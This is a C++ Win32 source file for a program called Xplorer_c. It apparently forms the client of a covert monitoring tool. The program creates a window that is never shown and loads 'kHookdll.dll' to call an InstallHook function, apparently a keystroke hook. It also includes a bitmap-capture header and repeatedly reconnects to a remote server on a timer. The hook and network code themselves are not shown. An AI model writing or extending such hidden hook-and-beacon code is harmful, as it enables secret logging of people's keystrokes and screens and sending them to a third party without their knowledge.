// Xplorer_c.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "resource.h"
#include "..\\common\\hashdefines.h"
#include "xplorer_csock.h"
#include <stdio.h>
#include "CatchBitmap.h"


// Global Variables:
HINSTANCE hInst;								// current instance
TCHAR szTitle[MAX_LOADSTRING];					// The title bar text
TCHAR szWindowClass[MAX_LOADSTRING];			// The title bar text
HWND		g_hApp;
TCHAR szTempPath[MAX_PATH];

// Foward declarations of functions included in this code module:
ATOM				MyRegisterClass(HINSTANCE hInstance);
BOOL				InitInstance(HINSTANCE, int);
LRESULT CALLBACK	WndProc(HWND, UINT, WPARAM, LPARAM);
LRESULT CALLBACK	About(HWND, UINT, WPARAM, LPARAM);

BOOL				g_bServerRunning = FALSE;


typedef BOOL (*HOOKFUNC)(); 

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{

 	// TODO: Place code here.
	MSG msg;
	HACCEL hAccelTable;

	// Initialize global strings
	LoadString(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
	LoadString(hInstance, IDC_XPLORER_C, szWindowClass, MAX_LOADSTRING);
	MyRegisterClass(hInstance);

	// Perform application initialization:
	if (!InitInstance (hInstance, nCmdShow)) 
	{
		return FALSE;
	}

	hAccelTable = LoadAccelerators(hInstance, (LPCTSTR)IDC_XPLORER_C);

	// Main message loop:
	while (GetMessage(&msg, NULL, 0, 0)) 
	{
		if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg)) 
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}

	return msg.wParam;
}



//
//  FUNCTION: MyRegisterClass()
//
//  PURPOSE: Registers the window class.
//
//  COMMENTS:
//
//    This function and its usage is only necessary if you want this code
//    to be compatible with Win32 systems prior to the 'RegisterClassEx'
//    function that was added to Windows 95. It is important to call this function
//    so that the application will get 'well formed' small icons associated
//    with it.
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
	WNDCLASSEX wcex;

	wcex.cbSize = sizeof(WNDCLASSEX); 

	wcex.style			= CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc	= (WNDPROC)WndProc;
	wcex.cbClsExtra		= 0;
	wcex.cbWndExtra		= 0;
	wcex.hInstance		= hInstance;
	wcex.hIcon			= LoadIcon(hInstance, (LPCTSTR)IDI_XPLORER_C);
	wcex.hCursor		= LoadCursor(NULL, IDC_ARROW);
	wcex.hbrBackground	= (HBRUSH)(COLOR_WINDOW+1);
	wcex.lpszMenuName	= (LPCSTR)IDC_XPLORER_C;
	wcex.lpszClassName	= szWindowClass;
	wcex.hIconSm		= LoadIcon(wcex.hInstance, (LPCTSTR)IDI_SMALL);

	return RegisterClassEx(&wcex);
}

//
//   FUNCTION: InitInstance(HANDLE, int)
//
//   PURPOSE: Saves instance handle and creates main window
//
//   COMMENTS:
//
//        In this function, we save the instance handle in a global variable and
//        create and display the main program window.
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
  
   hInst = hInstance; // Store instance handle in our global variable

   g_hApp = CreateWindow(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
      CW_USEDEFAULT, 0, 100, 100, NULL, NULL, hInstance, NULL);

   if (!g_hApp)
   {
      return FALSE;
   }

   //ShowWindow(hWnd, nCmdShow);
   //UpdateWindow(hWnd);

   return TRUE;
}

//
//  FUNCTION: WndProc(HWND, unsigned, WORD, LONG)
//
//  PURPOSE:  Processes messages for the main window.
//
//  WM_COMMAND	- process the application menu
//  WM_PAINT	- Paint the main window
//  WM_DESTROY	- post a quit message and return
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	int					wmId, wmEvent;
	PAINTSTRUCT			ps;
	HDC					hdc;
	TCHAR				szHello[MAX_LOADSTRING];
	static HINSTANCE	hinstDLL; 
	HOOKFUNC			HookFunc;


	LoadString(hInst, IDS_HELLO, szHello, MAX_LOADSTRING);

	switch (message) 
	{
		case WM_CREATE:
			{
// 				if(!GetTempPath(MAX_PATH, szTempPath))
// 				{
// 					DestroyWindow(hWnd);
// 					break;
// 				}
				//GetTempPath(MAX_PATH, szTempPath);
				strcpy(szTempPath, "C:\\");

				if(!InitSockLib())
				{
					ShowMessage(_T("failed to initalized sockets."));
				}

				//install hook
				hinstDLL = LoadLibrary((LPCTSTR) "kHookdll.dll"); 
				if(hinstDLL != NULL)
				{
					HookFunc = (HOOKFUNC)GetProcAddress(hinstDLL, "InstallHook"); 
					if(HookFunc != NULL)
					{
						ShowMessage("Hook dll loaded.");
						HookFunc();
					}
					else
					{
						ShowMessage(_T("Cannot load InstallHook function."));
					}
				}
				else
				{
					ShowMessage(_T("Cannot find kHookdll."));
				}


				//try connecting every 30 secs
				SetTimer(hWnd,ID_TIMER1,60000,NULL);

				g_bServerRunning = ConnectToServer();
				if(g_bServerRunning == INI_ERR)
				{
					DestroyWindow(hWnd);
				}
			}
			break;

		case WM_COMMAND:
			wmId    = LOWORD(wParam); 
			wmEvent = HIWORD(wParam); 
			// Parse the menu selections:
			switch (wmId)
			{
				case IDM_ABOUT:
				   DialogBox(hInst, (LPCTSTR)IDD_ABOUTBOX, hWnd, (DLGPROC)About);
				   break;
				case IDM_EXIT:
				   DestroyWindow(hWnd);
				   break;
				default:
				   return DefWindowProc(hWnd, message, wParam, lParam);
			}
			break;
		case WM_PAINT:
			hdc = BeginPaint(hWnd, &ps);
			// TODO: Add any drawing code here...
			RECT rt;
			GetClientRect(hWnd, &rt);
			DrawText(hdc, szHello, (int)strlen(szHello), &rt, DT_CENTER);
			EndPaint(hWnd, &ps);
			break;

		case WM_TIMER:
			switch(wParam)
			{
				case ID_TIMER1:
					if(!g_bServerRunning)
						g_bServerRunning = ConnectToServer();
					break;
			}
			break;

		case WM_DESTROY:
			HookFunc = (HOOKFUNC)GetProcAddress(hinstDLL, "UnHook"); 
			if(HookFunc != NULL)
				HookFunc();
			PostQuitMessage(0);
			break;
		default:
			return DefWindowProc(hWnd, message, wParam, lParam);
   }
   return 0;
}

// Mesage handler for about box.
LRESULT CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
		case WM_INITDIALOG:
				return TRUE;

		case WM_COMMAND:
			if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL) 
			{
				EndDialog(hDlg, LOWORD(wParam));
				return TRUE;
			}
			break;
	}
    return FALSE;
}
